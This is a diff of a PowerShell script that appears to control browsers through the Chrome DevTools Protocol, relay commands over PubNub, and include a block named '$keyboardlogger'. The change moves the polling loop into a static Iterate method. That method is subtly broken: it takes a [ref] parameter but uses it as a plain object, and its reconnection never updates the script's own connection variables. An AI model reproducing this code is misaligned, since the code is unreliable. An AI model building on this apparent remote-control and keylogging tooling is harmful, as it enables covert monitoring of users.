@@ -1329,10 +1329,8 @@ function Find-PubNubBrowser {
 }
 
 class PSCDPException : System.Exception {
-    [bool]$ispubnubnull
 
-    PSCDPException([string]$Message, $ispubnubnull) : base($Message) {
-        $this.ispubnubnull = $ispubnubnull
+    PSCDPException([string]$Message) : base($Message) {
     }
 }
 
@@ -2046,11 +2044,6 @@ class PSCDP {
 
     [void] Broadcast() {
 
-        if ( $null -eq $this.pubnubTarget ) {
-            throw [PSCDPException]::new("pubnub target null", $true)
-        }
-
-
         $cmd = @{
             builtincmd="SendBroadcast"
             source="pscdp.relay.ps1"
@@ -2062,7 +2055,6 @@ class PSCDP {
         $this.SendPBMessage($cmd)
     }
 
-    # anchor
     [void] LogState() {
         $msgstrs = @()
         $msgstrs += "[$($this.wsname)]"
@@ -2082,6 +2074,41 @@ class PSCDP {
 
         $msgstr = $msgstrs -join " "
         Log-Msg $msgstr
+    }
+
+    static [void] Iterate([ref]$cdpobj, [bool]$broadcast) {
+        $cdpobj.LogState()
+
+        $systemok = $cdpobj.IsSystemOk()
+
+        if ( ! $systemok ) {
+            Log-Msg "$($cdpobj.wsname) system not ok -- connecting"
+            
+            $cdpobj = [PSCDP]::new($cdpobj.debugport, $cdpobj.pubnuburl, $cdpobj.wsname)
+            $cdpobj.ConnectCdp()
+
+            $systemok = $cdpobj.IsSystemOk()
+            
+            if ( ! $systemok ) {
+                throw [PSCDPException]::new('pubnubws system not ok -- skipping to next iteration')
+            }
+
+        } else {
+
+            $cdpobj.InitReceive()
+            $cdpobj.ReadMessage()
+            $cdpobj.EndMessage()
+
+            $cdpobj.ExecCallbacks()
+            $cdpobj.NextCmd()
+
+            if ( $broadcast ) {
+                $cdpobj.Broadcast()
+                $cdpobj.GetBrowserVersion()
+                $cdpobj.PingPBTarget()
+            }
+
+        }
     }
 
 }
@@ -2115,67 +2142,29 @@ $keyboardlogger = {
 $d = 250
 $n = 50
 $i = 0
+
 while ( $true ) {
 
     Log-Msg "new iteration -- $($i+1)/$n"
 
     try {
-        $script:pubnubws.LogState()
-
-        $systemok = $script:pubnubws.IsSystemOk()
-
-        if ( ! $systemok ) {
-            $script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl, "pubnubws")
-            $script:pubnubws.ConnectCdp()
-
-            throw [PSCDPException]::new('pubnubws system not ok -- reconnecting')
-        } else {
-
-            $script:pubnubws.InitReceive()
-            $script:pubnubws.ReadMessage()
-            $script:pubnubws.EndMessage()
-
-            $script:pubnubws.ExecCallbacks()
-            $script:pubnubws.NextCmd()    
-
-            if ( $i -ge $n ) {
-                $script:pubnubws.Broadcast()
-                $script:pubnubws.GetBrowserVersion()
-                $script:pubnubws.PingPBTarget()
-                $i=0
-            }
-        }
-
+        [PSCDP]::Iterate($script:pubnubws, ( $i -ge $n ))
     } catch {
         Log-Msg $_
     }
 
-
     try {
-        $script:clientws.LogState()
-
-        $systemok = $script:clientws.IsSystemOk()
-
-        if ( ! $systemok ) {
-            $script:clientws = [PSCDP]::new($clientport, $null, "clientws")
-            $script:clientws.ConnectCdp()
-
-            throw [PSCDPException]::new('clientws system not ok -- reconnecting')
-        } else {
-            $script:clientws.InitReceive()
-            $script:clientws.ReadMessage()
-            $script:clientws.EndMessage()
-
-            $script:clientws.ExecCallbacks()
-            $script:clientws.NextCmd()
-        }
-
+        [PSCDP]::Iterate($script:clientws, ( $i -ge $n ))
     } catch {
         Log-Msg $_
     }
 
     Start-Sleep -Milliseconds $d
     $i++
+
+    if ( $i -ge $n ) {
+        $i = 0
+    }
 }
 
 exit
